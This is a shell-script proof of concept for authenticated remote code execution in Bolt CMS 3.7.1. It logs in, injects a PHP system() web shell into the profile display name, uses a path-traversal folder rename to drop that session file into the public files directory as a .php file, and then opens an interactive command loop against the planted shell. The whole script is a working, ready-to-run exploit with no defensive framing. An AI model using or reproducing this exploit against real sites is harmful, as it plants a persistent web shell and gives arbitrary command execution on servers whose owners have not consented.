#!/bin/sh

# Bolt 3.7.1 Authenticated RCE poc in sh

if [ $# -lt 3 ]; then
    echo "ERR: No arguments provided!"
    echo "usage: poc.sh <URL> <USERNAME> <PASSWORD>"
    echo "example: sh poc.sh \"http://10.10.69.113:8000\" \"bolt\" \"boltadmin123\""
    exit 1
fi

# general data
URL="$1"
BOLT_USER="$2"
BOLT_PASSWORD="$3"


# login
echo "Grabbing login token and cookie"
LOGINPAGE=$(curl -s "${URL}/bolt/login" -D -)
LOGIN_TOKEN=$(echo "${LOGINPAGE}" | grep 'user_login__token' | awk -F\" '{print $8}')
BASE_COOKIE=$(echo "${LOGINPAGE}" | grep 'Set-Cookie' | awk '{print $2}' | sed 's/;//')
echo "LOGIN_TOKEN=${LOGIN_TOKEN} BASE_COOKIE=${BASE_COOKIE}"

echo "Logging in"
LOGGEDIN=$(curl -s -X POST "${URL}/bolt/login" -H "Cookie: ${BASE_COOKIE}" -d "user_login%5Busername%5D=${BOLT_USER}&user_login%5Bpassword%5D=${BOLT_PASSWORD}&user_login%5Blogin%5D=&user_login%5B_token%5D=${LOGIN_TOKEN}" -D -)

echo "Grabbing new cookies after login"
AUTH_COOKIE=$(echo "${LOGGEDIN}" | grep 'bolt_authtoken' | awk '{print $2}' | sed 's/;//')
SESSION_COOKIE=$(echo "${LOGGEDIN}" | grep 'bolt_session_' | awk '{print $2}' | sed 's/;//')
echo "Cookies: AUTH_COOKIE=${AUTH_COOKIE}, SESSION_COOKIE=${SESSION_COOKIE}"


# changing profilename
echo "Changing profilename to <?php system(\$_GET[\"c\"]);?>"
CHANGE_TOKEN=$(curl -s "${URL}/bolt/profile" -H "Cookie: ${SESSION_COOKIE}; ${AUTH_COOKIE}" | grep '_token' | awk -F\" '{print $22}')
echo "CHANGE_TOKEN=${CHANGE_TOKEN}"
curl -s -X POST "${URL}/bolt/profile" -H "Cookie: ${SESSION_COOKIE}; ${AUTH_COOKIE}" -d "user_profile%5Bpassword%5D%5Bfirst%5D=${BOLT_PASSWORD}&user_profile%5Bpassword%5D%5Bsecond%5D=${BOLT_PASSWORD}&user_profile%5Bemail%5D=some%40junk.com&user_profile%5Bdisplayname%5D=%3C%3Fphp+system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E&user_profile%5Bsave%5D=&user_profile%5B_token%5D=${CHANGE_TOKEN}" -o /dev/null
echo "User's displayname changed"


# creating the php file with the path traversal
echo "Grabbing CSRFTOKEN"
CSRFTOKEN=$(curl -s "${URL}/bolt/overview/showcases" -H "Cookie: ${SESSION_COOKIE}; ${AUTH_COOKIE}" | grep 'data-bolt_csrf_token' | awk -F\" '{print $2}')
echo "CSRFTOKEN=${CSRFTOKEN}"

SESSION_COOKIE_VALUE=${SESSION_COOKIE##*=}

echo "Creating the malicious php file"
curl -s -X POST "${URL}/async/folder/rename" -H "Cookie: ${SESSION_COOKIE}; ${AUTH_COOKIE}" -d "namespace=root&parent=/app/cache/.sessions&oldname=${SESSION_COOKIE_VALUE}&newname=../../../public/files/rnfgrertt.php&token=${CSRFTOKEN}" -o /dev/null


# testing command execution
echo "Testing for command execution with uname -a"
curl -s "${URL}/files/rnfgrertt.php" --get --data-urlencode "c=uname -a" --output - | strings | grep displayname | awk -F\" '{print $NF}'

# shell
while IFS= read -r COMMAND;
do
    RESPONSE=$(curl -s "${URL}/files/rnfgrertt.php" --get --data-urlencode "c=${COMMAND}" --output - | strings)
    STARTLINE=$(echo "${RESPONSE}" | grep -n 'displayname";' | awk -F: '{print $1}')
    ENDLINE=$(echo "${RESPONSE}" | grep -n 'stack";' | awk -F: '{print $1}')

    OUT=$(echo "${RESPONSE}" | head -n $(( ENDLINE-2 )) | tail -n $(( ENDLINE-STARTLINE-1 )))
    echo "${OUT##*displayname\";s:27:\"}"
done
